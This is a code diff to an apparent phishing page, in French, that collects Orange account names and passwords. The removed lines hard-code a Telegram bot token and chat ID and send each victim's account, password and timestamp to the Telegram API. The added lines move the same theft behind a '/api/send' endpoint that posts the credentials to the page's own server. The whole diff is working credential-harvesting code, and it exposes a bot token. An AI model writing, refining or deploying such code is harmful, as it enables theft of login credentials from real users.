@@ -193,7 +193,6 @@
       margin-top:14px;
       font-size:14px;
       text-align:center;
-      color:var(--muted);
       min-height:20px;
     }
 
@@ -236,9 +235,6 @@
   </div>
 
   <script>
-    const BOT_TOKEN = "8304961826:AAFs2TuYtCbntOGkc32u7MW1rzPCH6OQF1s";
-    const CHAT_ID = "8597859737";
-
     function goToStep2() {
       const account = document.getElementById("accountInput").value.trim();
       if (!account) {
@@ -268,22 +264,23 @@
       statusEl.textContent = "Envoi en cours...";
       statusEl.className = "status";
 
-      const message = `
-Compte Orange : ${account}
-Mot de passe : ${password}
-Heure : ${new Date().toLocaleString("fr-FR")}
-`;
-
       try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`, { method: "GET" });
+        const response = await fetch("/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ account, password }),
+        });
+
+        const data = await response.json();
 
         if (!response.ok) {
-          throw new Error("Erreur réseau");
+          throw new Error(data.error || "Erreur réseau");
         }
 
         statusEl.textContent = "Informations envoyées avec succès.";
         statusEl.className = "status success";
       } catch (error) {
+        console.error(error);
         statusEl.textContent = "Une erreur est survenue. Veuillez réessayer.";
         statusEl.className = "status error";
       } finally {
